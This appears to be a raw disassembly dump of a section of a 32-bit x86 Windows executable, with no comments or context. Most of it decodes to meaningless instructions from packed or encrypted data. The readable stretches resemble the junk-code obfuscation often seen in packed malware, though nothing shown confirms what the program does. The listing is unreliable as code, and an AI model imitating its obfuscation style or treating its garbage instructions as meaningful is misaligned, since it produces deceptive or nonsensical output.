  41e7b7:	lds    ebx,FWORD PTR [eax-0x1c]
  41e7ba:	adc    ah,bh
  41e7bc:	cmp    DWORD PTR [esi-0x38],esp
  41e7bf:	mov    al,0x3e
  41e7c1:	xor    BYTE PTR [ebx-0xca5e57],dl
  41e7c7:	xor    ah,dh
  41e7c9:	sub    al,0x98
  41e7cb:	stc    
  41e7cc:	and    BYTE PTR [ecx-0x5333e623],bl
  41e7d2:	mov    al,0x3a
  41e7d4:	imul   ecx,DWORD PTR [ecx-0x7d1a9957],0xffffffcb
  41e7db:	and    bl,BYTE PTR ds:0x1293b8d5
  41e7e1:	mov    dl,0x62
  41e7e3:	adc    DWORD PTR [ecx+0x3a0a993c],esi
  41e7e9:	rcr    al,0x22
  41e7ec:	in     al,0x6e
  41e7ee:	je     0x41e790
  41e7f0:	out    dx,al
  41e7f1:	stos   DWORD PTR es:[di],eax
  41e7f3:	mov    al,ds:0xb8c923d5
  41e7f8:	xchg   edx,eax
  41e7f9:	xchg   esp,eax
  41e7fa:	inc    esi
  41e7fb:	cwde   
  41e7fc:	jns    0x41e79e
  41e7fe:	mov    al,ds:0x8c23508e
  41e803:	rol    DWORD PTR [edi],cl
  41e805:	inc    esi
  41e806:	cmp    al,0x4c
  41e808:	dec    eax
  41e809:	rol    BYTE PTR [edx-0x29e5460d],1
  41e80f:	mov    dh,0xa5
  41e811:	data16 mov al,0x2d
  41e814:	aas    
  41e815:	loope  0x41e879
  41e817:	push   0xffffffb5
  41e819:	mov    al,0x57
  41e81b:	ins    BYTE PTR es:[edi],dx
  41e81c:	mov    al,ds:0x5374a835
  41e821:	pop    esi
  41e822:	dec    ebx
  41e823:	or     eax,0x705d7510
  41e828:	out    0x0,al
  41e82a:	dec    esp
  41e82b:	and    eax,0x9be72e5a
  41e830:	stc    
  41e831:	xchg   ebx,eax
  41e832:	jae    0x41e88c
  41e834:	xlat   BYTE PTR ds:[ebx]
  41e835:	shl    DWORD PTR [eax-0x8],0xe2
  41e839:	int    0x6d
  41e83b:	ret    
  41e83c:	mov    ch,0x35
  41e83e:	retf   
  41e83f:	mov    bl,0xaf
  41e841:	sbb    eax,0x18265a30
  41e846:	jae    0x41e831
  41e848:	dec    ecx
  41e849:	sub    edi,0xffffff80
  41e84c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e84d:	dec    edi
  41e84e:	test   edx,esi
  41e850:	mov    DWORD PTR [eax-0x7fcbfe48],edx
  41e856:	test   ebp,esp
  41e858:	retf   
  41e859:	push   edi
  41e85a:	sub    eax,DWORD PTR [edi-0x5f]
  41e85d:	jl     0x41e824
  41e85f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e860:	xchg   edx,eax
  41e861:	dec    esi
  41e862:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e863:	push   ds
  41e864:	jle    0x41e7ea
  41e866:	sbb    al,0x82
  41e868:	fs xor al,0x16
  41e86b:	aaa    
  41e86c:	pusha  
  41e86d:	push   0x64195391
  41e872:	jo     0x41e8e9
  41e874:	jle    0x41e813
  41e876:	stc    
  41e877:	(bad)  
  41e878:	push   eax
  41e879:	iret   
  41e87a:	in     al,0xb8
  41e87c:	pop    edi
  41e87d:	push   esp
  41e87e:	adc    DWORD PTR [edi-0x1f76b4c4],esi
  41e884:	fsub   QWORD PTR [esp+eiz*2-0x4ff04143]
  41e88b:	pop    edx
  41e88c:	test   DWORD PTR [edx],ecx
  41e88e:	aam    0x30
  41e890:	(bad)  
  41e891:	repnz pop edx
  41e893:	fbld   TBYTE PTR [edi+eiz*4]
  41e896:	mov    bh,0x47
  41e898:	jmp    0xb5cc:0x631d9878
  41e89f:	arpl   WORD PTR [esi-0x1483d743],ax
  41e8a5:	mov    eax,0xc52c322e
  41e8aa:	or     ecx,DWORD PTR [edi+0x5c]
  41e8ad:	or     BYTE PTR [edx],ch
  41e8af:	xor    al,0xbc
  41e8b1:	int    0x57
  41e8b3:	stos   BYTE PTR es:[edi],al
  41e8b4:	or     ah,BYTE PTR [ebx-0x1f9f8ce3]
  41e8ba:	push   edx
  41e8bb:	pusha  
  41e8bc:	loopne 0x41e861
  41e8be:	imul   esi,DWORD PTR [esi+0x5b],0x6d
  41e8c2:	sbb    al,0xe2
  41e8c4:	mov    dl,0x6d
  41e8c6:	xchg   esi,eax
  41e8c7:	and    edi,DWORD PTR [eax+ebx*8-0x5d16034c]
  41e8ce:	loopne 0x41e8ce
  41e8d0:	leave  
  41e8d1:	call   0x992a760a
  41e8d6:	add    bl,cl
  41e8d8:	sub    al,0x56
  41e8da:	retf   
  41e8db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8dc:	iret   
  41e8dd:	or     al,0x99
  41e8df:	or     ebp,edi
  41e8e1:	pop    esp
  41e8e2:	sub    eax,0x68608005
  41e8e7:	cli    
  41e8e8:	std    
  41e8e9:	jge    0x41e8a9
  41e8eb:	out    0x41,al
  41e8ed:	inc    esp
  41e8ee:	test   ch,bh
  41e8f0:	cmp    eax,0xa0612d96
  41e8f5:	repz mov esi,0x58e32af2
  41e8fb:	dec    ebp
  41e8fc:	sbb    eax,0x1cb85169
  41e901:	sahf   
  41e902:	jbe    0x41e8c7
  41e904:	xlat   BYTE PTR ds:[ebx]
  41e906:	(bad)
  41e90a:	icebp  
  41e90b:	std    
  41e90c:	in     al,0x79
  41e90e:	call   0x267a:0x1a38db71
  41e915:	call   0x4cee:0xc8d5cdd9
  41e91c:	or     eax,0xb5dc8043
  41e921:	addr16 leave 
  41e923:	stos   DWORD PTR es:[edi],eax
  41e924:	mov    es,WORD PTR ss:[esi-0x4]
  41e928:	rol    dh,1
  41e92a:	iret   
  41e92b:	push   ecx
  41e92c:	cmp    al,0xa4
  41e92e:	mov    ebx,0xe827d666
  41e933:	std    
  41e934:	retf   0x3cc2
  41e937:	dec    ecx
  41e938:	(bad)  
  41e939:	jl     0x41e9a1
  41e93b:	adc    al,0xab
  41e93d:	popa   
  41e93e:	inc    edx
  41e93f:	jmp    0xe07498c
  41e944:	adc    dh,BYTE PTR [esi+0x8b121c4]
  41e94a:	adc    ebx,esp
  41e94c:	jnp    0x41e9b9
  41e94e:	in     al,0x99
  41e950:	out    dx,al
  41e951:	jbe    0x41e95f
  41e953:	popf   
  41e954:	push   ebp
  41e955:	dec    ebp
  41e956:	xor    ch,BYTE PTR [esi+0x1d9491a9]
  41e95c:	and    al,0x20
  41e95e:	ja     0x41e9c8
  41e960:	mov    ds:0xd8914c54,al
  41e965:	es repz jp 0x41e912
  41e969:	stos   DWORD PTR es:[edi],eax
  41e96a:	out    dx,eax
  41e96b:	iret   
  41e96c:	mov    dh,ch
  41e96e:	and    ecx,ebx
  41e970:	ret    0x3a1
  41e973:	ret    0xfc05
  41e976:	sbb    esi,DWORD PTR [edx]
  41e978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e979:	pop    ecx
  41e97a:	clc    
  41e97b:	shl    al,1
  41e97d:	into   
  41e97e:	adc    ebx,DWORD PTR ds:0xbe260e0
  41e984:	xlat   BYTE PTR ds:[ebx]
  41e985:	mov    ecx,edx
  41e987:	mov    edx,DWORD PTR [esp+0x18]
  41e98b:	xor    eax,ebx
  41e98d:	xor    ecx,esi
  41e98f:	mov    esi,DWORD PTR [esp+0x1c]
  41e993:	cmp    edx,eax
  41e995:	jne    0x41e9a3
  41e99b:	cmp    esi,ecx
  41e99d:	je     0x41e9ea
  41e9a3:	push   DWORD PTR ds:0x422648
  41e9a9:	push   DWORD PTR ds:0x4223dc
  41e9af:	mov    eax,ds:0x422558
  41e9b4:	mov    eax,DWORD PTR [eax+0x1a4]
  41e9ba:	push   DWORD PTR [eax]
  41e9bc:	mov    eax,DWORD PTR [esp+0x78]
  41e9c0:	call   eax
  41e9c2:	mov    ecx,DWORD PTR ds:0x422558
  41e9c8:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41e9ce:	mov    DWORD PTR [ecx],eax
  41e9d0:	mov    eax,ds:0x422558
  41e9d5:	push   0x4
  41e9d7:	add    eax,0x1dc
  41e9dc:	push   eax
  41e9dd:	lea    eax,[esp+0x84]
  41e9e4:	push   eax
  41e9e5:	call   0x415231
  41e9ea:	mov    eax,DWORD PTR [esp+0x7c]
  41e9ee:	mov    eax,DWORD PTR [eax]
  41e9f0:	pop    edi
  41e9f1:	pop    esi
  41e9f2:	pop    ebx
  41e9f3:	mov    esp,ebp
  41e9f5:	pop    ebp
  41e9f6:	ret    0xc
  41e9f9:	push   ebp
  41e9fa:	mov    ebp,esp
  41e9fc:	sub    esp,0x23c
  41ea02:	or     ecx,eax
  41ea04:	push   ebx
  41ea05:	cmp    DWORD PTR ds:0x428267,0x0
  41ea0c:	mov    DWORD PTR ds:0x428373,0x7749
  41ea16:	mov    DWORD PTR ds:0x428173,ebx
  41ea1c:	mov    DWORD PTR ds:0x428313,edx
  41ea22:	mov    DWORD PTR ds:0x428313,0xc7b
  41ea2c:	jmp    0x41ea8e
  41ea31:	mov    DWORD PTR ds:0x42828b,edx
  41ea37:	cmp    DWORD PTR ds:0x428267,0x0
  41ea3e:	jg     0x41ea74
  41ea44:	push   0x2154
  41ea49:	push   0x5063
  41ea4e:	call   DWORD PTR ds:0x428e14
  41ea54:	sbb    DWORD PTR ds:0x42836f,ecx
  41ea5a:	mov    ecx,DWORD PTR ds:0x42831b
  41ea60:	xor    ecx,DWORD PTR ds:0x428307
  41ea66:	mov    DWORD PTR ds:0x42831b,ecx
  41ea6c:	sbb    ecx,0x6e15
  41ea72:	neg    ecx
  41ea74:	xor    DWORD PTR ds:0x428243,ecx
  41ea7a:	adc    ecx,DWORD PTR ds:0x428197
  41ea80:	mov    ecx,DWORD PTR ds:0x4281e3
  41ea86:	mov    ecx,DWORD PTR [ecx]
  41ea88:	and    DWORD PTR ds:0x428187,ecx
  41ea8e:	push   esi
  41ea8f:	mov    ecx,DWORD PTR ds:0x4281f7
  41ea95:	mov    eax,ds:0x4282e3
  41ea9a:	sub    eax,ecx
  41ea9c:	imul   ecx,DWORD PTR [ecx+eax*1]
  41eaa0:	push   edi
  41eaa1:	add    DWORD PTR ds:0x42825b,ebx
  41eaa7:	mov    DWORD PTR [ebp-0x50],0x1
  41eaae:	sub    DWORD PTR ds:0x42828b,edi
  41eab4:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41eabe:	xor    DWORD PTR ds:0x42831b,0x437e
  41eac8:	mov    DWORD PTR [ebp-0xb8],0x1
  41ead2:	mov    ecx,DWORD PTR [ebp-0xb8]
  41ead8:	add    eax,0x2e28
  41eadd:	mov    eax,0x584
  41eae2:	xor    edx,edx
  41eae4:	sbb    DWORD PTR ds:0x428397,0x4282ef
  41eaee:	div    ecx
  41eaf0:	xor    ecx,0x2352
  41eaf6:	imul   eax,eax,0x51d4
  41eafc:	neg    ecx
  41eafe:	mov    ecx,DWORD PTR [ebp-0xbc]
  41eb04:	or     DWORD PTR ds:0x428383,0x428393
  41eb0e:	xor    eax,ecx
  41eb10:	and    eax,0x4c09
  41eb15:	xor    ecx,DWORD PTR ds:0x428303
  41eb1b:	mov    ecx,DWORD PTR [ebp-0x50]
  41eb1e:	xor    edx,edx
  41eb20:	and    DWORD PTR ds:0x42825b,0x42818f
  41eb2a:	div    ecx
  41eb2c:	or     DWORD PTR ds:0x4283a7,0x3423
  41eb36:	sub    eax,0x401
  41eb3b:	cmp    DWORD PTR ds:0x428327,0x0
  41eb42:	mov    DWORD PTR ds:0x428397,edx
  41eb48:	mov    DWORD PTR ds:0x428237,ebx
  41eb4e:	not    DWORD PTR ds:0x428233
  41eb54:	jmp    0x41ebb2
  41eb59:	mov    DWORD PTR ds:0x42822b,0x3ca0
  41eb63:	not    DWORD PTR ds:0x428317
  41eb69:	cmp    DWORD PTR ds:0x428327,0x0
  41eb70:	je     0x41eba0
  41eb76:	push   DWORD PTR [ebp-0x10]
  41eb79:	push   0x4da1
  41eb7e:	push   0x1144
  41eb83:	push   DWORD PTR [ebp-0x18]
  41eb86:	call   DWORD PTR ds:0x428e18
  41eb8c:	add    edx,0x1800
  41eb92:	add    edx,DWORD PTR ds:0x42838f
  41eb98:	sub    ecx,ecx
  41eb9a:	adc    ecx,0x47f1
  41eba0:	sub    edx,edx
  41eba2:	mov    DWORD PTR ds:0x428397,0x44a4
  41ebac:	and    ecx,DWORD PTR ds:0x42822f
  41ebb2:	mov    DWORD PTR [ebp-0x90],eax
  41ebb8:	mov    eax,ds:0x4282c3
  41ebbd:	mov    eax,DWORD PTR [eax]
  41ebbf:	sbb    DWORD PTR ds:0x428393,eax
  41ebc5:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41ebcf:	add    DWORD PTR ds:0x42815b,0x4282a7
  41ebd9:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41ebe0:	xor    DWORD PTR ds:0x42824f,edx
  41ebe6:	mov    DWORD PTR [ebp-0xb4],0x3842
  41ebf0:	or     edx,ecx
  41ebf2:	jmp    0x41ef4e
  41ebf7:	ret    0x8bf6
  41ebfa:	push   ebx
  41ebfb:	sbb    ch,BYTE PTR [ebx]
  41ebfd:	mov    edx,0x71125f66
  41ec02:	mov    al,0x26
  41ec04:	sbb    DWORD PTR [ebp+0x162f0eb0],ebp
  41ec0a:	sbb    BYTE PTR [ebx-0x76e7e7ee],ah
  41ec10:	fisub  WORD PTR [eax+0x31]
  41ec13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec14:	xor    al,cl
  41ec16:	mov    ah,cl
  41ec18:	arpl   ax,sp
  41ec1a:	xor    eax,0xf5960888
  41ec1f:	aaa    
  41ec20:	fiadd  DWORD PTR ss:[esi-0x7c65b1f1]
  41ec27:	add    eax,0xd0a41033
  41ec2c:	jne    0x41ebfe
  41ec2e:	int3   
  41ec2f:	ds int3 
  41ec31:	and    ebp,DWORD PTR [eax-0x4e287b0a]
  41ec37:	mov    dh,ch
  41ec39:	jbe    0x41ec04
  41ec3b:	out    dx,al
  41ec3c:	inc    edx
  41ec3d:	xor    esp,ebx
  41ec3f:	ret    0x99e5
  41ec42:	ja     0x41ebe7
  41ec44:	mov    eax,0x2c79fe1d
  41ec49:	les    edi,FWORD PTR [edx]
  41ec4b:	push   ds
  41ec4c:	push   ebp
  41ec4d:	stos   BYTE PTR es:[edi],al
  41ec4e:	mov    esp,0x9b8c813f
  41ec53:	lock outs dx,BYTE PTR ds:[esi]
  41ec55:	ins    DWORD PTR es:[edi],dx
  41ec56:	adc    eax,0xecf2d108
  41ec5b:	mov    eax,DWORD PTR [ebx]
  41ec5d:	dec    esi
  41ec5e:	and    esp,DWORD PTR [ecx+0x6b5d6ff4]
  41ec64:	mov    WORD PTR [ecx-0x33],es
  41ec67:	ins    DWORD PTR es:[edi],dx
  41ec68:	mov    al,ds:0x43af82c4
  41ec6d:	(bad)  
  41ec6f:	xlat   BYTE PTR ds:[ebx]
  41ec70:	adc    eax,0x4bc7aa42
  41ec75:	jb     0x70aa92b5
  41ec7b:	xchg   BYTE PTR [edi+ebp*4],bl
  41ec7e:	mov    eax,0x9ead25a2
  41ec83:	pop    ds
  41ec84:	and    DWORD PTR [edx],esi
  41ec86:	int3   
  41ec87:	xchg   esp,eax
  41ec88:	inc    eax
  41ec89:	mov    edx,0x480b089d
  41ec8e:	pop    esi
  41ec8f:	sub    eax,0x1b65d4ce
  41ec94:	int3   
  41ec95:	jo     0x41ec74
  41ec97:	add    eax,0xd5a7797c
  41ec9c:	scas   eax,DWORD PTR es:[edi]
  41ec9d:	jne    0x41ec90
  41ec9f:	mov    edi,0x8efb6149
  41eca4:	inc    esi
  41eca5:	sub    DWORD PTR [ebx],ebx
  41eca7:	push   0xf90e8462
  41ecac:	push   ss
  41ecad:	lock loop 0x41ed15
  41ecb0:	fcom   QWORD PTR ds:[ebx-0x5a]
  41ecb4:	fbstp  TBYTE PTR [ecx-0x7e]
  41ecb7:	bswap  edx
  41ecb9:	inc    eax
  41ecba:	sbb    ebx,DWORD PTR [ebx+0x6cbf0dcd]
  41ecc0:	and    BYTE PTR [ebp+0x70],ch
  41ecc3:	outs   dx,DWORD PTR ds:[esi]
  41ecc4:	fist   DWORD PTR [ebp+0x58f2b5c8]
  41ecca:	lods   eax,DWORD PTR ds:[esi]
  41eccb:	jns    0x41ecb2
  41eccd:	pop    edi
  41ecce:	mov    esi,edx
  41ecd0:	std    
  41ecd1:	mov    al,ds:0xb24badc
  41ecd6:	inc    esi
  41ecd7:	aaa    
  41ecd8:	mov    eax,ds:0xe4ee400f
  41ecdd:	xor    al,bl
  41ecdf:	ds mov esp,0x30909afe
  41ece5:	and    eax,0x16e78cf
  41ecea:	aad    0x44
  41ecec:	sti    
  41eced:	jbe    0x41ed27
  41ecef:	lahf   
  41ecf0:	hlt    
  41ecf1:	mov    esp,DWORD PTR [edx]
  41ecf3:	gs mov ch,0xac
  41ecf6:	jl     0x41ed44
  41ecf8:	inc    eax
  41ecf9:	ds call 0x47a9:0x5ce28186
  41ed01:	jp     0x41ed71
  41ed03:	cmp    eax,0x725b547d
  41ed08:	lea    ebx,[eax+0x30]
  41ed0b:	inc    esp
  41ed0c:	pop    ebx
  41ed0d:	push   ebp
  41ed0e:	xchg   DWORD PTR [eax+esi*1+0x34],eax
  41ed12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed13:	jnp    0x41eccb
  41ed15:	arpl   WORD PTR [ebx+0x32096715],bx
  41ed1b:	scas   eax,DWORD PTR es:[edi]
  41ed1c:	retf   
  41ed1d:	jo     0x41ece9
  41ed1f:	rcr    BYTE PTR [eax],1
  41ed21:	scas   al,BYTE PTR es:[edi]
  41ed22:	dec    edi
  41ed23:	inc    eax
  41ed24:	add    DWORD PTR [esi+0x77],esi
  41ed27:	sbb    bh,BYTE PTR [esi+0x2f]
  41ed2a:	ficom  DWORD PTR [ebx+0x12]
  41ed2d:	push   eax
  41ed2e:	mov    esp,gs
  41ed30:	fincstp 
  41ed32:	fdiv   QWORD PTR [eax+0x3258b8d2]
  41ed38:	lahf   
  41ed39:	(bad)  
  41ed3a:	repz adc BYTE PTR [edi-0x7d],0x23
  41ed3f:	aad    0x92
  41ed41:	(bad)  
  41ed42:	sahf   
  41ed43:	xchg   esp,eax
  41ed44:	cmp    al,0xd9
  41ed46:	outs   dx,DWORD PTR ds:[esi]
  41ed47:	mov    eax,ds:0xc8d3bacc
  41ed4c:	mov    cl,0x17
  41ed4e:	in     al,0x51
  41ed50:	jno    0x41ed74
  41ed52:	xor    cl,bl
  41ed54:	cli    
  41ed55:	xchg   edx,eax
  41ed56:	(bad)  
  41ed57:	shl    esp,1
  41ed59:	xchg   esi,eax
  41ed5a:	aam    0x43
  41ed5c:	xchg   ebx,eax
  41ed5d:	or     ebp,DWORD PTR [eax-0x1799aa0f]
  41ed63:	mov    al,0x9e
  41ed65:	mov    ah,0xa0
  41ed67:	dec    eax
  41ed68:	push   esi
  41ed69:	icebp  
  41ed6a:	xor    eax,0xd58480d3
  41ed6f:	fdiv   DWORD PTR [edi+0x5a7a4c47]
  41ed75:	cmp    DWORD PTR [edx+edi*4],edx
  41ed78:	test   eax,0xab9bb5c7
  41ed7d:	scas   eax,DWORD PTR es:[edi]
  41ed7e:	into   
  41ed7f:	enter  0x803e,0xf4
  41ed83:	jge    0x41eddf
  41ed85:	into   
  41ed86:	jae    0x41edc8
  41ed88:	xchg   edx,eax
  41ed89:	push   esi
  41ed8a:	xchg   edx,eax
  41ed8b:	push   ebx
  41ed8c:	sti    
  41ed8d:	inc    ebp
  41ed8e:	add    BYTE PTR [edi-0x1d854885],ah
  41ed94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed95:	and    eax,0x68f74163
  41ed9a:	xor    edx,DWORD PTR [edi+0x31]
  41ed9d:	dec    ebx
  41ed9e:	data16 in al,dx
  41eda0:	pop    dx
  41eda2:	adc    al,0x40
  41eda4:	mov    ebp,DWORD PTR ds:[edi]
  41eda7:	je     0x41ed82
  41eda9:	mov    dl,BYTE PTR [eax+0x5c]
  41edac:	xchg   ecx,eax
  41edad:	popf   
  41edae:	into   
  41edaf:	add    bh,BYTE PTR [ecx-0x69]
  41edb2:	adc    DWORD PTR [eax+ecx*1-0x3864e771],edx
  41edb9:	push   ebp
  41edba:	js     0x41edc7
  41edbc:	aaa    
  41edbd:	aam    0x86
  41edbf:	jmp    0x41ed62
  41edc1:	jbe    0x41edf5
  41edc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edc4:	pop    edi
  41edc5:	xlat   BYTE PTR ds:[ebx]
  41edc6:	xor    ebp,edi
  41edc8:	adc    DWORD PTR [edx-0x56d6d84b],ecx
  41edce:	test   eax,0x3cdb4cde
  41edd3:	(bad)  
  41edd4:	fsub   DWORD PTR [edx]
  41edd6:	dec    ebx
  41edd7:	data16 scas al,BYTE PTR es:[edi]
  41edd9:	push   0xffffffb3
  41eddb:	inc    edx
  41eddc:	jae    0x41edc6
  41edde:	mov    ecx,0xa911c091
  41ede3:	mov    esp,0xd0c8aec3
  41ede8:	push   edx
  41ede9:	out    0x7f,al
  41edeb:	in     al,0x49
  41eded:	test   bh,bl
  41edef:	and    DWORD PTR [ebx+0x582f0ff5],0x8e5d80c1
  41edf9:	mov    cl,0x4
  41edfb:	lods   eax,DWORD PTR ds:[esi]
  41edfc:	js     0x41edff
  41edfe:	leave  
  41edff:	call   0x9098:0xb3930e30
  41ee06:	mov    esp,0xc664d06c
  41ee0b:	call   0xfbce:0xaa5ea4db
  41ee12:	xor    al,0xe6
  41ee14:	sub    eax,0xf92e69c8
  41ee19:	stos   BYTE PTR es:[edi],al
  41ee1a:	jno    0x41edbd
  41ee1c:	mov    edx,0xf91a7815
  41ee21:	cmp    esi,ebx
  41ee23:	xor    al,0x91
  41ee25:	and    DWORD PTR [ebp-0x608ca789],esp
  41ee2b:	dec    ebx
  41ee2c:	(bad)  
  41ee2d:	fst    st(5)
  41ee2f:	or     eax,0xbb5e6c55
  41ee34:	push   eax
  41ee35:	jg     0x41eeb0
  41ee37:	ja     0x41eeb2
  41ee39:	jmp    0xfb46:0xd4e00508
  41ee40:	xchg   DWORD PTR [esi-0x43],eax
  41ee43:	and    BYTE PTR [edx+0x280d6172],al
  41ee49:	push   ss
  41ee4a:	(bad)  
  41ee4b:	(bad)  
  41ee4c:	int3   
  41ee4d:	(bad)  
  41ee4e:	lahf   
  41ee4f:	test   esp,esp
  41ee51:	test   edx,0x86fc9fe9
  41ee57:	xchg   ebx,eax
  41ee58:	std    
  41ee59:	sub    bh,0x3b
  41ee5c:	or     bl,dl
  41ee5e:	repz cld 
  41ee60:	repz pusha 
  41ee62:	cwde   
  41ee63:	hlt    
  41ee64:	xchg   ebx,eax
  41ee65:	lods   eax,DWORD PTR ds:[esi]
  41ee66:	addr16 mov dl,0x4c
  41ee69:	xchg   DWORD PTR [esi+0x2ed19fb4],ebx
  41ee6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee70:	fiadd  DWORD PTR [ebp+0x6c66e058]
  41ee76:	sub    al,BYTE PTR [eax+edi*8]
  41ee79:	(bad)  
  41ee7a:	jmp    DWORD PTR [ebp-0x721dd845]
  41ee80:	test   al,0xa4
  41ee82:	lods   al,BYTE PTR ds:[esi]
  41ee83:	sbb    ecx,DWORD PTR [ecx-0x983e16f]
  41ee89:	adc    DWORD PTR [ebp-0x44],0x8b54480e
  41ee90:	inc    esi
  41ee91:	mov    ds:0x2d9ccb57,eax
  41ee96:	leave  
  41ee97:	cmc    
  41ee98:	stos   DWORD PTR es:[edi],eax
  41ee99:	fidiv  WORD PTR [si-0x4c]
  41ee9d:	mov    edx,0x8776ea0
  41eea2:	mov    ds:0x68fcc0a2,eax
  41eea7:	xchg   edx,ecx
  41eea9:	and    BYTE PTR [esi+0x7e0145d2],al
  41eeaf:	retf   0xf7b0
  41eeb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eeb3:	and    BYTE PTR [edx+ebx*2],0x60
  41eeb7:	xor    al,0xc1
  41eeb9:	hlt    
  41eeba:	fs (bad) 
  41eebc:	(bad)  
  41eebd:	(bad)  
  41eebe:	and    ch,BYTE PTR [edi+0x3bef0f3]
  41eec4:	mov    bh,0xc2
  41eec6:	jno    0x41ee79
  41eec8:	sti    
  41eec9:	cs call 0x70ee182c
  41eecf:	lods   eax,DWORD PTR ds:[esi]
  41eed0:	push   0x28d5dd06
  41eed5:	cmp    al,0x8a
  41eed7:	dec    edi
  41eed8:	mov    bl,0x4b
  41eeda:	push   ebp
  41eedb:	(bad)  
  41eedd:	inc    ebx
  41eede:	call   0xf867c5
  41eee3:	mul    BYTE PTR [ebx-0x57]
  41eee6:	mov    BYTE PTR [ebp-0x2ac4ef83],ah
  41eeec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eeed:	mov    dl,BYTE PTR [ecx+0x44]
  41eef0:	test   eax,0xa04027d2
  41eef5:	fbstp  TBYTE PTR ds:0x3f88e51d
  41eefb:	pop    ds
  41eefc:	outs   dx,DWORD PTR ds:[esi]
  41eefd:	push   ss
  41eefe:	ins    DWORD PTR es:[edi],dx
  41eeff:	mov    cl,0x6b
  41ef01:	mov    DWORD PTR [ecx-0x65],eax
  41ef04:	xor    BYTE PTR [edx-0x2f1e7a45],bh
  41ef0a:	cdq    
  41ef0b:	adc    edi,ebx
  41ef0d:	bound  edx,QWORD PTR [ebx+0x5]
  41ef10:	jae    0x41ef3d
  41ef12:	pop    esi
  41ef13:	je     0x41ef33
  41ef15:	sbb    al,0xb2
  41ef17:	sbb    DWORD PTR [esi-0x4f],ebx
  41ef1a:	mov    ecx,0x32a8ff73
  41ef1f:	cmp    al,0x26
  41ef21:	push   0xc89cd5b1
  41ef26:	cs xchg ebx,eax
  41ef28:	mov    ds:0x9b52f655,eax
  41ef2d:	out    dx,eax
  41ef2e:	push   edi
  41ef2f:	shr    BYTE PTR [ebx+0x3f42e8e9],1
  41ef35:	xchg   ecx,ebp
  41ef37:	xchg   ebx,eax
  41ef38:	(bad)  
  41ef39:	push   ebp
  41ef3a:	mov    ?,eax
  41ef3c:	fwait
  41ef3d:	sub    eax,0x60c81169
  41ef42:	ins    DWORD PTR es:[edi],dx
  41ef43:	jmp    0xa87e:0x16be7f5c
  41ef4a:	(bad)  
  41ef4b:	addr16 gs dec edi
  41ef4e:	mov    eax,DWORD PTR [ebp-0x4c]
  41ef51:	adc    DWORD PTR ds:0x42816f,0x3493
  41ef5b:	add    eax,DWORD PTR [ebp-0xb4]
  41ef61:	xor    edx,0x29c
  41ef67:	xor    eax,0x2e02
  41ef6c:	sbb    ecx,ecx
  41ef6e:	xor    eax,0x7294
  41ef73:	movzx  edx,WORD PTR ds:0x428293
  41ef7a:	sbb    DWORD PTR ds:0x42816f,edx
  41ef80:	imul   eax,eax,0x68f3
  41ef86:	and    DWORD PTR ds:0x428187,edi
  41ef8c:	mov    ecx,DWORD PTR [ebp-0x8c]
  41ef92:	cmp    DWORD PTR ds:0x4282fb,0x0
  41ef99:	mov    edx,0x254
  41ef9e:	mov    edx,0x254c
  41efa3:	mov    edx,0x6b4f
  41efa8:	jmp    0x41f000
  41efad:	mov    DWORD PTR ds:0x4282eb,0x78fa
  41efb7:	cmp    DWORD PTR ds:0x4282fb,0x0
  41efbe:	jb     0x41efe4
  41efc4:	push   DWORD PTR [ebp-0x1c]
  41efc7:	push   0x74cd
  41efcc:	push   0x4a2f
  41efd1:	call   DWORD PTR ds:0x428e1c
  41efd7:	sub    edx,DWORD PTR ds:0x42822f
  41efdd:	inc    edx
  41efde:	and    edx,DWORD PTR ds:0x42824b
  41efe4:	mov    DWORD PTR ds:0x428393,0x703b
  41efee:	and    edx,DWORD PTR ds:0x42823b
  41eff4:	xor    edx,DWORD PTR ds:0x4282a7
  41effa:	and    DWORD PTR ds:0x4283a7,edx
  41f000:	and    eax,ecx
  41f002:	sub    eax,0x2818
  41f007:	mov    DWORD PTR [ebp-0xe8],eax
  41f00d:	jmp    0x41f369
  41f012:	adc    al,0x29
  41f015:	fstp   DWORD PTR [ebx]
  41f017:	and    BYTE PTR [edx+0x3a],ah
  41f01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f01b:	repz mov ebx,0xd868b0
  41f021:	mov    esi,0x18162999
  41f026:	mov    ds:0x80181812,eax
  41f02b:	fbstp  TBYTE PTR [ecx+0x7f8a7ef8]
  41f031:	pop    ds
  41f032:	call   0xe362:0x7368a592
  41f039:	mov    esp,0xe45294f3
  41f03e:	ror    BYTE PTR [ebp-0x28],1
  41f041:	xchg   ebp,eax
  41f042:	sbb    esp,ecx
  41f044:	bound  esp,QWORD PTR [eax+0x68f56553]
  41f04a:	mov    ebp,0x68132e36
  41f04f:	and    edx,DWORD PTR ds:0xf6555ddc
  41f055:	fwait
  41f056:	xor    ah,BYTE PTR [ecx+0x1e47055]
  41f05c:	jno    0x41f078
  41f05e:	inc    eax
  41f05f:	jo     0x41f073
  41f061:	fbstp  TBYTE PTR [ecx]
  41f063:	sar    DWORD PTR [edi+eiz*2+0x2fe84058],0x6
  41f06b:	into   
  41f06c:	pop    es
  41f06d:	test   DWORD PTR [edi],ecx
  41f06f:	sub    esp,edx
  41f071:	xchg   esi,eax
  41f072:	add    dh,BYTE PTR [ecx-0x5c]
  41f075:	mov    ebx,gs
  41f077:	push   edx
  41f078:	ins    BYTE PTR es:[edi],dx
  41f079:	add    BYTE PTR [ebx-0x59],bl
  41f07c:	fs dec eax
  41f07e:	mov    esi,0x89d5d9b8
  41f083:	rcl    DWORD PTR [edi],cl
  41f085:	nop
  41f086:	fucom  st(7)
  41f088:	(bad)  
